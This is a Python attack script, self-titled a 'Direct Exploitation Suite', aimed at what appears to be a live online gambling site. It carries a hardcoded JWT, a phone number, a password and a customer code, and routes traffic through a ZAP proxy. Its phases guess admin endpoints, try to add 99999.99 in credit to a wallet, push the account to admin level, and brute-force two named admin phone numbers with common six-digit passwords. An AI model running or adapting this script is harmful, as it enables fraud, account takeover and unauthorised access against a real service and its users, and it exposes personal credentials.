#!/usr/bin/env python3

import requests
import json
import time
import sys
import jwt
from urllib.parse import urljoin

# Configuration - Using existing token from the provided data
TARGET_DOMAIN = "https://jklmn23456.com"
FRONTEND_DOMAIN = "https://pigslot.co"
CUSTOMER_CODE = "PS663888386"
PHONE_NUMBER = "0960422161"

# The JWT token from the provided data
EXISTING_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTYyODE3NTAsInBob25lX251bWJlciI6IjA5NjA0MjIxNjEiLCJ1c2VyX3VpZCI6ImRjZmQ0MzI0LWJjMjMtNDQ1OS1hMjE0LTA3Yjg0NWIwZmZiMiIsImN1c3RvbWVyX2NvZGUiOiJQUzY2Mzg4ODM4NiIsImdhbWVfdG9rZW4iOiJnYW1lLTM4NTc1ZjQ0LTEwMjUtNDA1Yi04MjY2LTRiODI3OGMwZDc4NCJ9.IyZ8E-6rBsH7S1fqpMwrMYWoI8pVuB2Z3bXvE0F7Ndw"

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")

def get_session(token):
    """Create session with proxy and auth token"""
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'th,en;q=0.9',
        'Cache-Control': 'no-cache',
        'Origin': FRONTEND_DOMAIN,
        'Referer': f'{FRONTEND_DOMAIN}/',
        'Authorization': f'bearer {token}',
        'Username': PHONE_NUMBER,
        'Password': '181242',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
    })
    return session

def test_admin_force_vulnerability():
    """Test the admin-force vulnerability"""
    print_info("Testing admin-force vulnerability...")
    
    session = get_session(EXISTING_TOKEN)
    
    try:
        # Test admin-force endpoint
        admin_force_url = f"{FRONTEND_DOMAIN}/admin-force"
        response = session.get(admin_force_url, timeout=15, verify=False)
        
        if response.status_code == 200:
            print_success(f"‚úÖ Admin-force accessible: {len(response.text)} bytes")
            
            # Check for admin indicators
            content_lower = response.text.lower()
            admin_indicators = ['admin', 'administrator', 'dashboard', '‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ï‡∏¥‡∏î‡∏ï‡∏±‡πâ‡∏á cookies ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö admin']
            
            found_indicators = [ind for ind in admin_indicators if ind in content_lower]
            if found_indicators:
                print_success(f"üéØ Admin indicators found: {found_indicators}")
                return True
            
            # Check if page content changed after admin-force
            print_success("Admin-force page loaded - admin privileges may be set")
            return True
            
    except Exception as e:
        print_error(f"Admin-force test failed: {e}")
    
    return False

def test_vip_status_api():
    """Test VIP status API from the provided data"""
    print_info("Testing VIP status API...")
    
    session = get_session(EXISTING_TOKEN)
    
    try:
        # Test the exact VIP endpoint from provided data
        vip_url = f"{TARGET_DOMAIN}/api/v1/loyalty/{CUSTOMER_CODE}/vip/status"
        response = session.get(vip_url, timeout=15, verify=False)
        
        if response.status_code == 200:
            vip_data = response.json()
            print_success("‚úÖ VIP API accessible")
            print_info(f"Current VIP Level: {vip_data.get('data', {}).get('user_vip_level')}")
            print_info(f"User Tier: {vip_data.get('data', {}).get('user_tier')}")
            print_info(f"User Star: {vip_data.get('data', {}).get('user_star')}")
            
            return vip_data
            
    except Exception as e:
        print_error(f"VIP API test failed: {e}")
    
    return None

def test_admin_endpoints_discovery():
    """Test discovery of admin endpoints using current token"""
    print_info("Testing admin endpoint discovery...")
    
    session = get_session(EXISTING_TOKEN)
    
    # Admin endpoints to test based on the VIP API pattern
    admin_endpoints = [
        f"/api/v1/admin/loyalty/{CUSTOMER_CODE}/vip/status",
        f"/api/v1/admin/user/{CUSTOMER_CODE}",
        f"/api/v1/admin/users",
        f"/api/v1/admin/dashboard",
        f"/api/v1/admin/stats",
        f"/api/v1/admin/system",
        f"/api/v1/admin/config",
        f"/api/v1/admin/wallet/{CUSTOMER_CODE}",
        f"/api/v1/admin/wallet/{CUSTOMER_CODE}/balance",
        f"/api/v1/admin/transactions",
        f"/api/v1/admin/loyalty/users",
        f"/api/v1/admin/vip/levels",
    ]
    
    accessible_endpoints = []
    
    for endpoint in admin_endpoints:
        try:
            url = f"{TARGET_DOMAIN}{endpoint}"
            response = session.get(url, timeout=10, verify=False)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    if data.get('status') == 'SUCCESS':
                        print_success(f"‚úÖ Admin endpoint accessible: {endpoint}")
                        accessible_endpoints.append(endpoint)
                    else:
                        print_info(f"Endpoint responded but not successful: {endpoint}")
                except:
                    print_info(f"Endpoint accessible (non-JSON): {endpoint}")
                    accessible_endpoints.append(endpoint)
            elif response.status_code == 403:
                print_warning(f"üîí Admin endpoint exists but forbidden: {endpoint}")
            elif response.status_code == 401:
                print_warning(f"üîë Admin endpoint exists but unauthorized: {endpoint}")
                
        except Exception as e:
            continue
    
    return accessible_endpoints

def test_credit_manipulation():
    """Test credit manipulation endpoints"""
    print_info("Testing credit manipulation...")
    
    session = get_session(EXISTING_TOKEN)
    
    # Credit manipulation endpoints
    credit_endpoints = [
        f"/api/v1/wallet/{CUSTOMER_CODE}/balance",
        f"/api/v1/wallet/{CUSTOMER_CODE}/add",
        f"/api/v1/wallet/{CUSTOMER_CODE}/credit",
        f"/api/v1/transaction/{CUSTOMER_CODE}/add",
        f"/api/v1/loyalty/{CUSTOMER_CODE}/credit",
        f"/api/v1/admin/wallet/{CUSTOMER_CODE}/add",
        f"/api/v1/admin/transaction/add",
        f"/api/v1/admin/credit/add",
    ]
    
    target_amount = 99999.99
    
    for endpoint in credit_endpoints:
        url = f"{TARGET_DOMAIN}{endpoint}"
        
        # Different payload formats to try
        payloads = [
            {"amount": target_amount, "type": "credit", "reason": "test"},
            {"balance": target_amount, "action": "add"},
            {"credit": target_amount},
            {"value": target_amount},
            {"add_amount": target_amount},
            {"customer_code": CUSTOMER_CODE, "amount": target_amount},
        ]
        
        for payload in payloads:
            try:
                # Test POST
                response = session.post(url, json=payload, timeout=10, verify=False)
                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('status') == 'SUCCESS':
                            print_success(f"üéØ CREDIT MANIPULATION SUCCESSFUL!")
                            print_success(f"Endpoint: {endpoint}")
                            print_success(f"Payload: {payload}")
                            print_success(f"Response: {result}")
                            return True
                    except:
                        pass
                
                # Test PUT
                response = session.put(url, json=payload, timeout=10, verify=False)
                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('status') == 'SUCCESS':
                            print_success(f"üéØ CREDIT MANIPULATION SUCCESSFUL (PUT)!")
                            print_success(f"Endpoint: {endpoint}")
                            print_success(f"Payload: {payload}")
                            print_success(f"Response: {result}")
                            return True
                    except:
                        pass
                        
            except Exception as e:
                continue
    
    return False

def test_privilege_escalation_via_vip():
    """Test privilege escalation via VIP level modification"""
    print_info("Testing VIP level privilege escalation...")
    
    session = get_session(EXISTING_TOKEN)
    
    # VIP manipulation endpoints
    vip_endpoints = [
        f"/api/v1/loyalty/{CUSTOMER_CODE}/vip/upgrade",
        f"/api/v1/loyalty/{CUSTOMER_CODE}/vip/set",
        f"/api/v1/admin/loyalty/{CUSTOMER_CODE}/vip",
        f"/api/v1/admin/vip/set",
    ]
    
    # Admin level payloads
    admin_payloads = [
        {"user_vip_level": "ADMIN", "user_tier": "Admin Level"},
        {"vip_level": "ADMIN", "tier": "Administrator"},
        {"level": "ADMIN", "privileges": ["admin"]},
        {"admin": True, "vip_level": "VIP10"},
        {"user_type": "admin", "role": "administrator"},
    ]
    
    for endpoint in vip_endpoints:
        url = f"{TARGET_DOMAIN}{endpoint}"
        
        for payload in admin_payloads:
            try:
                response = session.post(url, json=payload, timeout=10, verify=False)
                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('status') == 'SUCCESS':
                            print_success(f"üéØ VIP PRIVILEGE ESCALATION SUCCESSFUL!")
                            print_success(f"Endpoint: {endpoint}")
                            print_success(f"Payload: {payload}")
                            print_success(f"Response: {result}")
                            return True
                    except:
                        pass
                        
            except Exception as e:
                continue
    
    return False

def test_admin_phone_brute_force():
    """Test brute force on admin phone numbers"""
    print_info("Testing admin phone number brute force...")
    
    admin_phones = ["0642052671", "0818510592"]
    common_6digit_passwords = [
        "123456", "000000", "111111", "222222", "333333", "444444", "555555",
        "666666", "777777", "888888", "999999", "654321", "112233", "998877",
        "123123", "456456", "789789", "147258", "369258", "159753", "246810",
        "135792", "987654", "192837", "564738", "102938", "285749", "374658"
    ]
    
    session = requests.Session()
    session.proxies = PROXIES
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'Origin': FRONTEND_DOMAIN,
    })
    
    login_url = f"{TARGET_DOMAIN}/api/v1/auth/login"
    
    for phone in admin_phones:
        print_info(f"Testing admin phone: {phone}")
        
        for password in common_6digit_passwords:
            try:
                login_data = {
                    "username": phone,
                    "password": password
                }
                
                response = session.post(login_url, json=login_data, timeout=10, verify=False)
                
                if response.status_code == 200:
                    try:
                        result = response.json()
                        if result.get('status') == 'SUCCESS':
                            print_success(f"üéØ ADMIN CREDENTIALS FOUND!")
                            print_success(f"Phone: {phone}")
                            print_success(f"Password: {password}")
                            print_success(f"Response: {result}")
                            
                            # Get the admin token
                            admin_token = result.get('data', {}).get('access_token')
                            if admin_token:
                                print_success(f"Admin Token: {admin_token[:50]}...")
                                return phone, password, admin_token
                    except:
                        pass
                        
                time.sleep(1)  # Rate limiting
                
            except Exception as e:
                continue
    
    return None, None, None

def main():
    print_info("üéØ Direct Exploitation Suite")
    print_info("=" * 60)
    print_info(f"Target: {TARGET_DOMAIN}")
    print_info(f"Customer Code: {CUSTOMER_CODE}")
    print_info(f"Phone: {PHONE_NUMBER}")
    
    # Test 1: Admin-force vulnerability
    print_info("\nPhase 1: Testing admin-force vulnerability...")
    admin_force_success = test_admin_force_vulnerability()
    
    # Test 2: VIP Status API
    print_info("\nPhase 2: Testing VIP Status API...")
    vip_data = test_vip_status_api()
    
    # Test 3: Admin endpoint discovery
    print_info("\nPhase 3: Testing admin endpoint discovery...")
    admin_endpoints = test_admin_endpoints_discovery()
    
    # Test 4: Credit manipulation
    print_info("\nPhase 4: Testing credit manipulation...")
    credit_success = test_credit_manipulation()
    
    # Test 5: VIP privilege escalation
    print_info("\nPhase 5: Testing VIP privilege escalation...")
    vip_privilege_success = test_privilege_escalation_via_vip()
    
    # Test 6: Admin phone brute force
    print_info("\nPhase 6: Testing admin phone brute force...")
    admin_phone, admin_pass, admin_token = test_admin_phone_brute_force()
    
    # Summary
    print_info("\n" + "=" * 60)
    print_info("üéØ EXPLOITATION SUMMARY")
    print_info("=" * 60)
    
    if admin_force_success:
        print_success("‚úÖ Admin-force vulnerability confirmed")
    
    if vip_data:
        print_success(f"‚úÖ VIP API accessible - Current level: {vip_data.get('data', {}).get('user_vip_level')}")
    
    if admin_endpoints:
        print_success(f"‚úÖ Admin endpoints found: {len(admin_endpoints)}")
        for endpoint in admin_endpoints:
            print_success(f"   - {endpoint}")
    
    if credit_success:
        print_success("‚úÖ Credit manipulation successful!")
    
    if vip_privilege_success:
        print_success("‚úÖ VIP privilege escalation successful!")
    
    if admin_phone:
        print_success(f"‚úÖ Admin credentials found: {admin_phone}:{admin_pass}")
    
    if not any([admin_force_success, vip_data, admin_endpoints, credit_success, vip_privilege_success, admin_phone]):
        print_warning("‚ùå No successful exploitations found")
    else:
        print_success("üéØ VULNERABILITIES CONFIRMED - SYSTEM COMPROMISED!")
    
    print_info("\nCheck ZAP GUI for all captured traffic!")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()